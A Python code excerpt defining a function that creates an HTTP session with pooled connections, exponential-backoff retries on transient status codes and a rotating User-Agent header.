# Session creation with retry / backoff
# ──────────────────────────────────────────────────────────────────────────
def create_session(ua_index: int = 0) -> requests.Session:
    """
    Create a requests.Session with:
      - Connection reuse (pooling)
      - Exponential backoff retry ONLY on transient errors (429, 502, 503, 504)
      - 500 is intentionally excluded — it should be recorded, not retried,
        to avoid hanging on servers that always 500 for malformed payloads.
    """
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        connect=2,
        read=2,
        backoff_factor=0.5,                       # 0.5, 1, 2 seconds...
        status_forcelist=(429, 502, 503, 504),
        allowed_methods=frozenset(["GET", "POST", "HEAD", "OPTIONS"]),
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": USER_AGENTS[ua_index % len(USER_AGENTS)],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
    })
    return session


